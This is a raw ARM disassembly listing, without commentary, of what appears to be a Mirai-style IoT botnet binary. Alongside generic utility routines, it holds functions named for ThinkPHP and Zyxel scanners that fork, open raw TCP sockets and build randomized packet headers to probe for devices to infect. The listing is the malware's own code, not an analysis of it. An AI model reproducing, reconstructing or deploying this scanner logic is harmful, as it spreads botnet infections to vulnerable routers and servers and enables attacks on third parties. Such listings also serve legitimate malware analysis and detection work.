   14af0:	e7970008 	ldr	r0, [r7, r8]
   14af4:	eb0014d1 	bl	19e40 <__GI___libc_close>
   14af8:	e3e03000 	mvn	r3, #0
   14afc:	e7873008 	str	r3, [r7, r8]
   14b00:	e5864008 	str	r4, [r6, #8]
   14b04:	eaffff62 	b	14894 <thinkphp_scanner+0x864>
   14b08:	00028d7c 	.word	0x00028d7c
   14b0c:	0002b8ac 	.word	0x0002b8ac
   14b10:	00028dac 	.word	0x00028dac
   14b14:	0002b8b0 	.word	0x0002b8b0
   14b18:	00028d80 	.word	0x00028d80
   14b1c:	00028d84 	.word	0x00028d84
   14b20:	55555556 	.word	0x55555556
   14b24:	000201ec 	.word	0x000201ec

00014b28 <util_strlen>:
   14b28:	e1a02000 	mov	r2, r0
   14b2c:	e5d00000 	ldrb	r0, [r0]
   14b30:	e3500000 	cmp	r0, #0
   14b34:	012fff1e 	bxeq	lr
   14b38:	e3a00000 	mov	r0, #0
   14b3c:	e2800001 	add	r0, r0, #1
   14b40:	e7d03002 	ldrb	r3, [r0, r2]
   14b44:	e3530000 	cmp	r3, #0
   14b48:	1afffffb 	bne	14b3c <util_strlen+0x14>
   14b4c:	e12fff1e 	bx	lr

00014b50 <util_strcpy>:
   14b50:	e5d12000 	ldrb	r2, [r1]
   14b54:	e3520000 	cmp	r2, #0
   14b58:	01a0c002 	moveq	ip, r2
   14b5c:	0a000004 	beq	14b74 <util_strcpy+0x24>
   14b60:	e3a0c000 	mov	ip, #0
   14b64:	e28cc001 	add	ip, ip, #1
   14b68:	e7dc3001 	ldrb	r3, [ip, r1]
   14b6c:	e3530000 	cmp	r3, #0
   14b70:	1afffffb 	bne	14b64 <util_strcpy+0x14>
   14b74:	e1a0300c 	mov	r3, ip
   14b78:	ea000000 	b	14b80 <util_strcpy+0x30>
   14b7c:	e5f12001 	ldrb	r2, [r1, #1]!
   14b80:	e2433001 	sub	r3, r3, #1
   14b84:	e3730001 	cmn	r3, #1
   14b88:	e4c02001 	strb	r2, [r0], #1
   14b8c:	1afffffa 	bne	14b7c <util_strcpy+0x2c>
   14b90:	e1a0000c 	mov	r0, ip
   14b94:	e12fff1e 	bx	lr

00014b98 <util_memcpy>:
   14b98:	e3520000 	cmp	r2, #0
   14b9c:	012fff1e 	bxeq	lr
   14ba0:	e3a0c000 	mov	ip, #0
   14ba4:	e7dc3001 	ldrb	r3, [ip, r1]
   14ba8:	e7cc3000 	strb	r3, [ip, r0]
   14bac:	e28cc001 	add	ip, ip, #1
   14bb0:	e15c0002 	cmp	ip, r2
   14bb4:	1afffffa 	bne	14ba4 <util_memcpy+0xc>
   14bb8:	e12fff1e 	bx	lr

00014bbc <util_zero>:
   14bbc:	e3510000 	cmp	r1, #0
   14bc0:	012fff1e 	bxeq	lr
   14bc4:	e3a02000 	mov	r2, #0
   14bc8:	e3a03000 	mov	r3, #0
   14bcc:	e7c23000 	strb	r3, [r2, r0]
   14bd0:	e2822001 	add	r2, r2, #1
   14bd4:	e1520001 	cmp	r2, r1
   14bd8:	1afffffa 	bne	14bc8 <util_zero+0xc>
   14bdc:	e12fff1e 	bx	lr

00014be0 <util_memsearch>:
   14be0:	e1530001 	cmp	r3, r1
   14be4:	e92d4030 	push	{r4, r5, lr}
   14be8:	e1a0e003 	mov	lr, r3
   14bec:	e1a05000 	mov	r5, r0
   14bf0:	e1a04002 	mov	r4, r2
   14bf4:	da000002 	ble	14c04 <util_memsearch+0x24>
   14bf8:	e3e00000 	mvn	r0, #0
   14bfc:	e8bd4030 	pop	{r4, r5, lr}
   14c00:	e12fff1e 	bx	lr
   14c04:	e3510000 	cmp	r1, #0
   14c08:	dafffffa 	ble	14bf8 <util_memsearch+0x18>
   14c0c:	e3a00000 	mov	r0, #0
   14c10:	e1a0c000 	mov	ip, r0
   14c14:	ea000002 	b	14c24 <util_memsearch+0x44>
   14c18:	e2800001 	add	r0, r0, #1
   14c1c:	e1500001 	cmp	r0, r1
   14c20:	0afffff4 	beq	14bf8 <util_memsearch+0x18>
   14c24:	e7d4200c 	ldrb	r2, [r4, ip]
   14c28:	e7d03005 	ldrb	r3, [r0, r5]
   14c2c:	e1530002 	cmp	r3, r2
   14c30:	13a0c000 	movne	ip, #0
   14c34:	1afffff7 	bne	14c18 <util_memsearch+0x38>
   14c38:	e28cc001 	add	ip, ip, #1
   14c3c:	e15c000e 	cmp	ip, lr
   14c40:	1afffff4 	bne	14c18 <util_memsearch+0x38>
   14c44:	e2800001 	add	r0, r0, #1
   14c48:	eaffffeb 	b	14bfc <util_memsearch+0x1c>

00014c4c <util_atoi>:
   14c4c:	e92d45f0 	push	{r4, r5, r6, r7, r8, sl, lr}
   14c50:	e1a05000 	mov	r5, r0
   14c54:	e24dd004 	sub	sp, sp, #4
   14c58:	e1a06001 	mov	r6, r1
   14c5c:	e4d53001 	ldrb	r3, [r5], #1
   14c60:	e3530009 	cmp	r3, #9
   14c64:	13530020 	cmpne	r3, #32
   14c68:	e1a04003 	mov	r4, r3
   14c6c:	0afffffa 	beq	14c5c <util_atoi+0x10>
   14c70:	e353000a 	cmp	r3, #10
   14c74:	0afffff8 	beq	14c5c <util_atoi+0x10>
   14c78:	e353002d 	cmp	r3, #45	; 0x2d
   14c7c:	0a000039 	beq	14d68 <util_atoi+0x11c>
   14c80:	e353002b 	cmp	r3, #43	; 0x2b
   14c84:	04d54001 	ldrbeq	r4, [r5], #1
   14c88:	e3e07102 	mvn	r7, #-2147483648	; 0x80000000
   14c8c:	e3a0a000 	mov	sl, #0
   14c90:	e1a00007 	mov	r0, r7
   14c94:	e1a01006 	mov	r1, r6
   14c98:	eb000443 	bl	15dac <__aeabi_uidivmod>
   14c9c:	e1a00007 	mov	r0, r7
   14ca0:	e1a08001 	mov	r8, r1
   14ca4:	e1a01006 	mov	r1, r6
   14ca8:	eb000400 	bl	15cb0 <__udivsi3>
   14cac:	e1a0e000 	mov	lr, r0
   14cb0:	e3a00000 	mov	r0, #0
   14cb4:	e1a0c000 	mov	ip, r0
   14cb8:	e20430ff 	and	r3, r4, #255	; 0xff
   14cbc:	e2432030 	sub	r2, r3, #48	; 0x30
   14cc0:	e3520009 	cmp	r2, #9
   14cc4:	e2431061 	sub	r1, r3, #97	; 0x61
   14cc8:	e2442030 	sub	r2, r4, #48	; 0x30
   14ccc:	e2433041 	sub	r3, r3, #65	; 0x41
   14cd0:	9a000009 	bls	14cfc <util_atoi+0xb0>
   14cd4:	e3530019 	cmp	r3, #25
   14cd8:	83a02000 	movhi	r2, #0
   14cdc:	93a02001 	movls	r2, #1
   14ce0:	e3530019 	cmp	r3, #25
   14ce4:	83510019 	cmphi	r1, #25
   14ce8:	8a000017 	bhi	14d4c <util_atoi+0x100>
   14cec:	e3520000 	cmp	r2, #0
   14cf0:	03a03057 	moveq	r3, #87	; 0x57
   14cf4:	13a03037 	movne	r3, #55	; 0x37
   14cf8:	e0632004 	rsb	r2, r3, r4
   14cfc:	e1520006 	cmp	r2, r6
   14d00:	aa000011 	bge	14d4c <util_atoi+0x100>
   14d04:	e150000e 	cmp	r0, lr
   14d08:	93a03000 	movls	r3, #0
   14d0c:	83a03001 	movhi	r3, #1
   14d10:	e193cfac 	orrs	ip, r3, ip, lsr #31
   14d14:	1a000009 	bne	14d40 <util_atoi+0xf4>
   14d18:	e150000e 	cmp	r0, lr
   14d1c:	13a03000 	movne	r3, #0
   14d20:	03a03001 	moveq	r3, #1
   14d24:	e1520008 	cmp	r2, r8
   14d28:	d3a03000 	movle	r3, #0
   14d2c:	e3530000 	cmp	r3, #0
   14d30:	e3a0c001 	mov	ip, #1
   14d34:	00202096 	mlaeq	r0, r6, r0, r2
   14d38:	04d54001 	ldrbeq	r4, [r5], #1
   14d3c:	0affffdd 	beq	14cb8 <util_atoi+0x6c>
   14d40:	e4d54001 	ldrb	r4, [r5], #1
   14d44:	e3e0c000 	mvn	ip, #0
   14d48:	eaffffda 	b	14cb8 <util_atoi+0x6c>
   14d4c:	e35c0000 	cmp	ip, #0
   14d50:	ba000008 	blt	14d78 <util_atoi+0x12c>
   14d54:	e35a0000 	cmp	sl, #0
   14d58:	12600000 	rsbne	r0, r0, #0
   14d5c:	e28dd004 	add	sp, sp, #4
   14d60:	e8bd45f0 	pop	{r4, r5, r6, r7, r8, sl, lr}
   14d64:	e12fff1e 	bx	lr
   14d68:	e4d54001 	ldrb	r4, [r5], #1
   14d6c:	e3a07102 	mov	r7, #-2147483648	; 0x80000000
   14d70:	e3a0a001 	mov	sl, #1
   14d74:	eaffffc5 	b	14c90 <util_atoi+0x44>
   14d78:	e35a0000 	cmp	sl, #0
   14d7c:	03e00102 	mvneq	r0, #-2147483648	; 0x80000000
   14d80:	13a00102 	movne	r0, #-2147483648	; 0x80000000
   14d84:	eafffff4 	b	14d5c <util_atoi+0x110>

00014d88 <util_fdgets>:
   14d88:	e92d41f0 	push	{r4, r5, r6, r7, r8, lr}
   14d8c:	e1a07000 	mov	r7, r0
   14d90:	e1a08001 	mov	r8, r1
   14d94:	e1a06002 	mov	r6, r2
   14d98:	e1a04000 	mov	r4, r0
   14d9c:	e3a05000 	mov	r5, #0
   14da0:	e1a01004 	mov	r1, r4
   14da4:	e1a00006 	mov	r0, r6
   14da8:	e3a02001 	mov	r2, #1
   14dac:	eb00148f 	bl	19ff0 <__GI___libc_read>
   14db0:	e3500001 	cmp	r0, #1
   14db4:	1a000005 	bne	14dd0 <util_fdgets+0x48>
   14db8:	e2855001 	add	r5, r5, #1
   14dbc:	e1550008 	cmp	r5, r8
   14dc0:	aa000004 	bge	14dd8 <util_fdgets+0x50>
   14dc4:	e4d43001 	ldrb	r3, [r4], #1
   14dc8:	e353000a 	cmp	r3, #10
   14dcc:	1afffff3 	bne	14da0 <util_fdgets+0x18>
   14dd0:	e3550000 	cmp	r5, #0
   14dd4:	03a07000 	moveq	r7, #0
   14dd8:	e1a00007 	mov	r0, r7
   14ddc:	e8bd41f0 	pop	{r4, r5, r6, r7, r8, lr}
   14de0:	e12fff1e 	bx	lr

00014de4 <util_local_addr>:
   14de4:	e92d4070 	push	{r4, r5, r6, lr}
   14de8:	e3a06010 	mov	r6, #16
   14dec:	e24dd018 	sub	sp, sp, #24
   14df0:	e58d6014 	str	r6, [sp, #20]
   14df4:	eb000697 	bl	16858 <__GI___errno_location>
   14df8:	e3a04000 	mov	r4, #0
   14dfc:	e5804000 	str	r4, [r0]
   14e00:	e3a00002 	mov	r0, #2
   14e04:	e1a01000 	mov	r1, r0
   14e08:	e1a02004 	mov	r2, r4
   14e0c:	eb000890 	bl	17054 <__GI_socket>
   14e10:	e3700001 	cmn	r0, #1
   14e14:	e1a05000 	mov	r5, r0
   14e18:	01a00004 	moveq	r0, r4
   14e1c:	0a000010 	beq	14e64 <util_local_addr+0x80>
   14e20:	e59f3048 	ldr	r3, [pc, #72]	; 14e70 <util_local_addr+0x8c>
   14e24:	e28d4004 	add	r4, sp, #4
   14e28:	e58d3008 	str	r3, [sp, #8]
   14e2c:	e3a03002 	mov	r3, #2
   14e30:	e1a02006 	mov	r2, r6
   14e34:	e1a01004 	mov	r1, r4
   14e38:	e1cd30b4 	strh	r3, [sp, #4]
   14e3c:	e3a03c35 	mov	r3, #13568	; 0x3500
   14e40:	e1cd30b6 	strh	r3, [sp, #6]
   14e44:	eb00075d 	bl	16bc0 <__libc_connect>
   14e48:	e1a01004 	mov	r1, r4
   14e4c:	e28d2014 	add	r2, sp, #20
   14e50:	e1a00005 	mov	r0, r5
   14e54:	eb000776 	bl	16c34 <__GI_getsockname>
   14e58:	e1a00005 	mov	r0, r5
   14e5c:	eb0013f7 	bl	19e40 <__GI___libc_close>
   14e60:	e59d0008 	ldr	r0, [sp, #8]
   14e64:	e28dd018 	add	sp, sp, #24
   14e68:	e8bd4070 	pop	{r4, r5, r6, lr}
   14e6c:	e12fff1e 	bx	lr
   14e70:	0894ad6b 	.word	0x0894ad6b

00014e74 <util_stristr>:
   14e74:	e92d4070 	push	{r4, r5, r6, lr}
   14e78:	e5d23000 	ldrb	r3, [r2]
   14e7c:	e3530000 	cmp	r3, #0
   14e80:	e1a04002 	mov	r4, r2
   14e84:	e1a06000 	mov	r6, r0
   14e88:	01a05003 	moveq	r5, r3
   14e8c:	0a000004 	beq	14ea4 <util_stristr+0x30>
   14e90:	e3a05000 	mov	r5, #0
   14e94:	e2855001 	add	r5, r5, #1
   14e98:	e7d53004 	ldrb	r3, [r5, r4]
   14e9c:	e3530000 	cmp	r3, #0
   14ea0:	1afffffb 	bne	14e94 <util_stristr+0x20>
   14ea4:	e1a00006 	mov	r0, r6
   14ea8:	e3a02000 	mov	r2, #0
   14eac:	e3510000 	cmp	r1, #0
   14eb0:	e2411001 	sub	r1, r1, #1
   14eb4:	da00000f 	ble	14ef8 <util_stristr+0x84>
   14eb8:	e4d0c001 	ldrb	ip, [r0], #1
   14ebc:	e24c3041 	sub	r3, ip, #65	; 0x41
   14ec0:	e3530019 	cmp	r3, #25
   14ec4:	e7d43002 	ldrb	r3, [r4, r2]
   14ec8:	e243e041 	sub	lr, r3, #65	; 0x41
   14ecc:	938cc060 	orrls	ip, ip, #96	; 0x60
   14ed0:	e35e0019 	cmp	lr, #25
   14ed4:	93833060 	orrls	r3, r3, #96	; 0x60
   14ed8:	e15c0003 	cmp	ip, r3
   14edc:	13a02000 	movne	r2, #0
   14ee0:	1afffff1 	bne	14eac <util_stristr+0x38>
   14ee4:	e2822001 	add	r2, r2, #1
   14ee8:	e1550002 	cmp	r5, r2
   14eec:	1affffee 	bne	14eac <util_stristr+0x38>
   14ef0:	e0660000 	rsb	r0, r6, r0
   14ef4:	ea000000 	b	14efc <util_stristr+0x88>
   14ef8:	e3e00000 	mvn	r0, #0
   14efc:	e8bd4070 	pop	{r4, r5, r6, lr}
   14f00:	e12fff1e 	bx	lr

00014f04 <util_strcmp>:
   14f04:	e5d03000 	ldrb	r3, [r0]
   14f08:	e3530000 	cmp	r3, #0
   14f0c:	01a0c003 	moveq	ip, r3
   14f10:	0a000004 	beq	14f28 <util_strcmp+0x24>
   14f14:	e3a0c000 	mov	ip, #0
   14f18:	e28cc001 	add	ip, ip, #1
   14f1c:	e7dc3000 	ldrb	r3, [ip, r0]
   14f20:	e3530000 	cmp	r3, #0
   14f24:	1afffffb 	bne	14f18 <util_strcmp+0x14>
   14f28:	e5d13000 	ldrb	r3, [r1]
   14f2c:	e3530000 	cmp	r3, #0
   14f30:	01a02003 	moveq	r2, r3
   14f34:	0a000004 	beq	14f4c <util_strcmp+0x48>
   14f38:	e3a02000 	mov	r2, #0
   14f3c:	e2822001 	add	r2, r2, #1
   14f40:	e7d23001 	ldrb	r3, [r2, r1]
   14f44:	e3530000 	cmp	r3, #0
   14f48:	1afffffb 	bne	14f3c <util_strcmp+0x38>
   14f4c:	e152000c 	cmp	r2, ip
   14f50:	0a000007 	beq	14f74 <util_strcmp+0x70>
   14f54:	e3a00000 	mov	r0, #0
   14f58:	e12fff1e 	bx	lr
   14f5c:	e5d02000 	ldrb	r2, [r0]
   14f60:	e5d13000 	ldrb	r3, [r1]
   14f64:	e1520003 	cmp	r2, r3
   14f68:	1afffff9 	bne	14f54 <util_strcmp+0x50>
   14f6c:	e2800001 	add	r0, r0, #1
   14f70:	e2811001 	add	r1, r1, #1
   14f74:	e25cc001 	subs	ip, ip, #1
   14f78:	2afffff7 	bcs	14f5c <util_strcmp+0x58>
   14f7c:	e3a00001 	mov	r0, #1
   14f80:	e12fff1e 	bx	lr

00014f84 <util_strncmp>:
   14f84:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   14f88:	e5d03000 	ldrb	r3, [r0]
   14f8c:	e3530000 	cmp	r3, #0
   14f90:	e1a0c002 	mov	ip, r2
   14f94:	01a0e003 	moveq	lr, r3
   14f98:	0a000004 	beq	14fb0 <util_strncmp+0x2c>
   14f9c:	e3a0e000 	mov	lr, #0
   14fa0:	e28ee001 	add	lr, lr, #1
   14fa4:	e7de3000 	ldrb	r3, [lr, r0]
   14fa8:	e3530000 	cmp	r3, #0
   14fac:	1afffffb 	bne	14fa0 <util_strncmp+0x1c>
   14fb0:	e5d13000 	ldrb	r3, [r1]
   14fb4:	e3530000 	cmp	r3, #0
   14fb8:	01a02003 	moveq	r2, r3
   14fbc:	0a000004 	beq	14fd4 <util_strncmp+0x50>
   14fc0:	e3a02000 	mov	r2, #0
   14fc4:	e2822001 	add	r2, r2, #1
   14fc8:	e7d23001 	ldrb	r3, [r2, r1]
   14fcc:	e3530000 	cmp	r3, #0
   14fd0:	1afffffb 	bne	14fc4 <util_strncmp+0x40>
   14fd4:	e152000c 	cmp	r2, ip
   14fd8:	a15e000c 	cmpge	lr, ip
   14fdc:	aa000002 	bge	14fec <util_strncmp+0x68>
   14fe0:	ea000007 	b	15004 <util_strncmp+0x80>
   14fe4:	e2800001 	add	r0, r0, #1
   14fe8:	e2811001 	add	r1, r1, #1
   14fec:	e25cc001 	subs	ip, ip, #1
   14ff0:	3a000006 	bcc	15010 <util_strncmp+0x8c>
   14ff4:	e5d02000 	ldrb	r2, [r0]
   14ff8:	e5d13000 	ldrb	r3, [r1]
   14ffc:	e1520003 	cmp	r2, r3
   15000:	0afffff7 	beq	14fe4 <util_strncmp+0x60>
   15004:	e3a00000 	mov	r0, #0
   15008:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   1500c:	e12fff1e 	bx	lr
   15010:	e3a00001 	mov	r0, #1
   15014:	eafffffb 	b	15008 <util_strncmp+0x84>

00015018 <util_itoa>:
   15018:	e92d45f0 	push	{r4, r5, r6, r7, r8, sl, lr}
   1501c:	e2528000 	subs	r8, r2, #0
   15020:	e24dd02c 	sub	sp, sp, #44	; 0x2c
   15024:	e1a06001 	mov	r6, r1
   15028:	0a000033 	beq	150fc <util_itoa+0xe4>
   1502c:	e3500000 	cmp	r0, #0
   15030:	03a03030 	moveq	r3, #48	; 0x30
   15034:	05c83000 	strbeq	r3, [r8]
   15038:	05c80001 	strbeq	r0, [r8, #1]
   1503c:	0a00002e 	beq	150fc <util_itoa+0xe4>
   15040:	e1a03fa0 	lsr	r3, r0, #31
   15044:	e351000a 	cmp	r1, #10
   15048:	13a02000 	movne	r2, #0
   1504c:	02032001 	andeq	r2, r3, #1
   15050:	e3a03000 	mov	r3, #0
   15054:	e3520000 	cmp	r2, #0
   15058:	e5cd3027 	strb	r3, [sp, #39]	; 0x27
   1505c:	01a04000 	moveq	r4, r0
   15060:	01a0a002 	moveq	sl, r2
   15064:	12604000 	rsbne	r4, r0, #0
   15068:	13a0a001 	movne	sl, #1
   1506c:	e3a05020 	mov	r5, #32
   15070:	e28d7006 	add	r7, sp, #6
   15074:	e1a00004 	mov	r0, r4
   15078:	e1a01006 	mov	r1, r6
   1507c:	eb00034a 	bl	15dac <__aeabi_uidivmod>
   15080:	e3510009 	cmp	r1, #9
   15084:	e2813030 	add	r3, r1, #48	; 0x30
   15088:	e1a00004 	mov	r0, r4
   1508c:	c2813037 	addgt	r3, r1, #55	; 0x37
   15090:	e1a01006 	mov	r1, r6
   15094:	e7c53007 	strb	r3, [r5, r7]
   15098:	eb000304 	bl	15cb0 <__udivsi3>
   1509c:	e2504000 	subs	r4, r0, #0
   150a0:	e2455001 	sub	r5, r5, #1
   150a4:	1afffff2 	bne	15074 <util_itoa+0x5c>
   150a8:	e35a0000 	cmp	sl, #0
   150ac:	128d3028 	addne	r3, sp, #40	; 0x28
   150b0:	10832005 	addne	r2, r3, r5
   150b4:	13a0302d 	movne	r3, #45	; 0x2d
   150b8:	15423022 	strbne	r3, [r2, #-34]	; 0xffffffde
   150bc:	02855001 	addeq	r5, r5, #1
   150c0:	e7d73005 	ldrb	r3, [r7, r5]
   150c4:	e3530000 	cmp	r3, #0
   150c8:	e0872005 	add	r2, r7, r5
   150cc:	13a01000 	movne	r1, #0
   150d0:	0a00000d 	beq	1510c <util_itoa+0xf4>
   150d4:	e2811001 	add	r1, r1, #1
   150d8:	e7d13002 	ldrb	r3, [r1, r2]
   150dc:	e3530000 	cmp	r3, #0
   150e0:	1afffffb 	bne	150d4 <util_itoa+0xbc>
   150e4:	e1a00008 	mov	r0, r8
   150e8:	e2411001 	sub	r1, r1, #1
   150ec:	e4d23001 	ldrb	r3, [r2], #1
   150f0:	e3710001 	cmn	r1, #1
   150f4:	e4c03001 	strb	r3, [r0], #1
   150f8:	1afffffa 	bne	150e8 <util_itoa+0xd0>
   150fc:	e1a00008 	mov	r0, r8
   15100:	e28dd02c 	add	sp, sp, #44	; 0x2c
   15104:	e8bd45f0 	pop	{r4, r5, r6, r7, r8, sl, lr}
   15108:	e12fff1e 	bx	lr
   1510c:	e1a01003 	mov	r1, r3
   15110:	eafffff3 	b	150e4 <util_itoa+0xcc>

00015114 <zyxelscanner_scanner_kill>:
   15114:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   15118:	e59f3018 	ldr	r3, [pc, #24]	; 15138 <zyxelscanner_scanner_kill+0x24>
   1511c:	e24dd004 	sub	sp, sp, #4
   15120:	e5930000 	ldr	r0, [r3]
   15124:	e3a01009 	mov	r1, #9
   15128:	eb00041b 	bl	1619c <__GI_kill>
   1512c:	e28dd004 	add	sp, sp, #4
   15130:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   15134:	e12fff1e 	bx	lr
   15138:	00028db0 	.word	0x00028db0

0001513c <zyxelscanner_setup_connection>:
   1513c:	e92d4070 	push	{r4, r5, r6, lr}
   15140:	e1a05000 	mov	r5, r0
   15144:	e5900000 	ldr	r0, [r0]
   15148:	e24dd010 	sub	sp, sp, #16
   1514c:	e3a06000 	mov	r6, #0
   15150:	e3700001 	cmn	r0, #1
   15154:	e58d6000 	str	r6, [sp]
   15158:	e58d6004 	str	r6, [sp, #4]
   1515c:	e58d6008 	str	r6, [sp, #8]
   15160:	e58d600c 	str	r6, [sp, #12]
   15164:	1b001335 	blne	19e40 <__GI___libc_close>
   15168:	e3a00002 	mov	r0, #2
   1516c:	e3a01001 	mov	r1, #1
   15170:	e1a02006 	mov	r2, r6
   15174:	eb0007b6 	bl	17054 <__GI_socket>
   15178:	e3700001 	cmn	r0, #1
   1517c:	e5850000 	str	r0, [r5]
   15180:	0a00001e 	beq	15200 <zyxelscanner_setup_connection+0xc4>
   15184:	e2850018 	add	r0, r5, #24
   15188:	e3a01b01 	mov	r1, #1024	; 0x400
   1518c:	e5856014 	str	r6, [r5, #20]
   15190:	ebfffe89 	bl	14bbc <util_zero>
   15194:	e5954000 	ldr	r4, [r5]
   15198:	e1a02006 	mov	r2, r6
   1519c:	e3a01003 	mov	r1, #3
   151a0:	e1a00004 	mov	r0, r4
   151a4:	eb000382 	bl	15fb4 <__GI___libc_fcntl>
   151a8:	e3a01004 	mov	r1, #4
   151ac:	e3802b02 	orr	r2, r0, #2048	; 0x800
   151b0:	e1a00004 	mov	r0, r4
   151b4:	eb00037e 	bl	15fb4 <__GI___libc_fcntl>
   151b8:	e59f304c 	ldr	r3, [pc, #76]	; 1520c <zyxelscanner_setup_connection+0xd0>
   151bc:	e5931000 	ldr	r1, [r3]
   151c0:	e595300c 	ldr	r3, [r5, #12]
   151c4:	e58d3004 	str	r3, [sp, #4]
   151c8:	e3a03002 	mov	r3, #2
   151cc:	e5952008 	ldr	r2, [r5, #8]
   151d0:	e1cd30b0 	strh	r3, [sp]
   151d4:	e2422002 	sub	r2, r2, #2
   151d8:	e1d531b0 	ldrh	r3, [r5, #16]
   151dc:	e3520001 	cmp	r2, #1
   151e0:	e1cd30b2 	strh	r3, [sp, #2]
   151e4:	83a03001 	movhi	r3, #1
   151e8:	e5851004 	str	r1, [r5, #4]
   151ec:	85853008 	strhi	r3, [r5, #8]
   151f0:	e5950000 	ldr	r0, [r5]
   151f4:	e1a0100d 	mov	r1, sp
   151f8:	e3a02010 	mov	r2, #16
   151fc:	eb00066f 	bl	16bc0 <__libc_connect>
   15200:	e28dd010 	add	sp, sp, #16
   15204:	e8bd4070 	pop	{r4, r5, r6, lr}
   15208:	e12fff1e 	bx	lr
   1520c:	00028de0 	.word	0x00028de0

00015210 <zyxelscanner_scanner_init>:
   15210:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   15214:	e24dde72 	sub	sp, sp, #1824	; 0x720
   15218:	e3a03000 	mov	r3, #0
   1521c:	e24dd00c 	sub	sp, sp, #12
   15220:	e58d3724 	str	r3, [sp, #1828]	; 0x724
   15224:	eb001149 	bl	19750 <__libc_fork>
   15228:	e3700001 	cmn	r0, #1
   1522c:	13a03000 	movne	r3, #0
   15230:	03a03001 	moveq	r3, #1
   15234:	e3500000 	cmp	r0, #0
   15238:	d1a04003 	movle	r4, r3
   1523c:	c3834001 	orrgt	r4, r3, #1
   15240:	e59f3a48 	ldr	r3, [pc, #2632]	; 15c90 <zyxelscanner_scanner_init+0xa80>
   15244:	e3540000 	cmp	r4, #0
   15248:	e5830000 	str	r0, [r3]
   1524c:	0a000003 	beq	15260 <zyxelscanner_scanner_init+0x50>
   15250:	e28ddfcb 	add	sp, sp, #812	; 0x32c
   15254:	e28ddb01 	add	sp, sp, #1024	; 0x400
   15258:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   1525c:	e12fff1e 	bx	lr
   15260:	ebfffedf 	bl	14de4 <util_local_addr>
   15264:	e59f1a28 	ldr	r1, [pc, #2600]	; 15c94 <zyxelscanner_scanner_init+0xa84>
   15268:	e5810000 	str	r0, [r1]
   1526c:	ebfff4f8 	bl	12654 <rand_init>
   15270:	e1a00004 	mov	r0, r4
   15274:	eb00045c 	bl	163ec <__GI_time>
   15278:	e59f2a18 	ldr	r2, [pc, #2584]	; 15c98 <zyxelscanner_scanner_init+0xa88>
   1527c:	e3a01b03 	mov	r1, #3072	; 0xc00
   15280:	e5820000 	str	r0, [r2]
   15284:	e3a00c01 	mov	r0, #256	; 0x100
   15288:	eb000a53 	bl	17bdc <calloc>
   1528c:	e59f3a08 	ldr	r3, [pc, #2568]	; 15c9c <zyxelscanner_scanner_init+0xa8c>
   15290:	e58d4724 	str	r4, [sp, #1828]	; 0x724
   15294:	e5830000 	str	r0, [r3]
   15298:	e1a0c004 	mov	ip, r4
   1529c:	e59fe9f8 	ldr	lr, [pc, #2552]	; 15c9c <zyxelscanner_scanner_init+0xa8c>
   152a0:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
   152a4:	e59e0000 	ldr	r0, [lr]
   152a8:	e1a0260c 	lsl	r2, ip, #12
   152ac:	e042250c 	sub	r2, r2, ip, lsl #10
   152b0:	e1a01603 	lsl	r1, r3, #12
   152b4:	e283c001 	add	ip, r3, #1
   152b8:	e0411503 	sub	r1, r1, r3, lsl #10
   152bc:	e0822000 	add	r2, r2, r0
   152c0:	e3a05000 	mov	r5, #0
   152c4:	e3e03000 	mvn	r3, #0
   152c8:	e35c00ff 	cmp	ip, #255	; 0xff
   152cc:	e7813000 	str	r3, [r1, r0]
   152d0:	e5825008 	str	r5, [r2, #8]
   152d4:	e58dc724 	str	ip, [sp, #1828]	; 0x724
   152d8:	daffffef 	ble	1529c <zyxelscanner_scanner_init+0x8c>
   152dc:	e3a01003 	mov	r1, #3
   152e0:	e3a00002 	mov	r0, #2
   152e4:	e3a02006 	mov	r2, #6
   152e8:	eb000759 	bl	17054 <__GI_socket>
   152ec:	e59f19ac 	ldr	r1, [pc, #2476]	; 15ca0 <zyxelscanner_scanner_init+0xa90>
   152f0:	e3700001 	cmn	r0, #1
   152f4:	e1a04000 	mov	r4, r0
   152f8:	e5810000 	str	r0, [r1]
   152fc:	0a00014b 	beq	15830 <zyxelscanner_scanner_init+0x620>
   15300:	e3a01003 	mov	r1, #3
   15304:	e1a02005 	mov	r2, r5
   15308:	eb000329 	bl	15fb4 <__GI___libc_fcntl>
   1530c:	e3a01004 	mov	r1, #4
   15310:	e3802b02 	orr	r2, r0, #2048	; 0x800
   15314:	e1a00004 	mov	r0, r4
   15318:	eb000325 	bl	15fb4 <__GI___libc_fcntl>
   1531c:	e28d3e72 	add	r3, sp, #1824	; 0x720
   15320:	e2833008 	add	r3, r3, #8
   15324:	e3a02001 	mov	r2, #1
   15328:	e5232004 	str	r2, [r3, #-4]!
   1532c:	e59f296c 	ldr	r2, [pc, #2412]	; 15ca0 <zyxelscanner_scanner_init+0xa90>
   15330:	e3a0c004 	mov	ip, #4
   15334:	e5920000 	ldr	r0, [r2]
   15338:	e1a01005 	mov	r1, r5
   1533c:	e3a02003 	mov	r2, #3
   15340:	e58dc000 	str	ip, [sp]
   15344:	eb000730 	bl	1700c <__GI_setsockopt>
   15348:	e3500000 	cmp	r0, #0
   1534c:	1a000134 	bne	15824 <zyxelscanner_scanner_init+0x614>
   15350:	ebfff4a8 	bl	125f8 <rand_next>
   15354:	e1a00800 	lsl	r0, r0, #16
   15358:	e1a0c820 	lsr	ip, r0, #16
   1535c:	e20c30ff 	and	r3, ip, #255	; 0xff
   15360:	e1a03403 	lsl	r3, r3, #8
   15364:	e1833c20 	orr	r3, r3, r0, lsr #24
   15368:	e3530b01 	cmp	r3, #1024	; 0x400
   1536c:	e58dc014 	str	ip, [sp, #20]
   15370:	3afffff6 	bcc	15350 <zyxelscanner_scanner_init+0x140>
   15374:	e59fe928 	ldr	lr, [pc, #2344]	; 15ca4 <zyxelscanner_scanner_init+0xa94>
   15378:	e5de3000 	ldrb	r3, [lr]
   1537c:	e3c3300a 	bic	r3, r3, #10
   15380:	e3833005 	orr	r3, r3, #5
   15384:	e5ce3000 	strb	r3, [lr]
   15388:	e5de2000 	ldrb	r2, [lr]
   1538c:	e3c220b0 	bic	r2, r2, #176	; 0xb0
   15390:	e3822040 	orr	r2, r2, #64	; 0x40
